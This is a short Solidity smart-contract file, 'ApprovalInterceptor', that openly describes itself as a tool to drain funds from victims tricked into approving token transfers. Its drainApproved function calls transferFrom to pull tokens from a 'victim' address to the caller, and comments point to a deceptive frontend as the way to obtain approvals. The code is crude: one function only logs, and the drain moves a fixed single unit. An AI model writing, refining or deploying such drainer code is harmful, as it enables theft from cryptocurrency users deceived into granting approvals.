// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title ApprovalInterceptor - Logs and mimics token approvals to drain funds later
interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
}

contract ApprovalInterceptor {
    event ApprovalIntercepted(address indexed user, address token, uint256 amount);

    function approveAndLeak(address token, uint256 amount) external {
        emit ApprovalIntercepted(msg.sender, token, amount);
        // Fake approval call simulation â€” actual approval must be done by dApp or frontend trick
    }

    function drainApproved(address token, address victim) external {
        IERC20(token).transferFrom(victim, msg.sender, 1); // exploits if frontend tricked victim to approve
    }
}
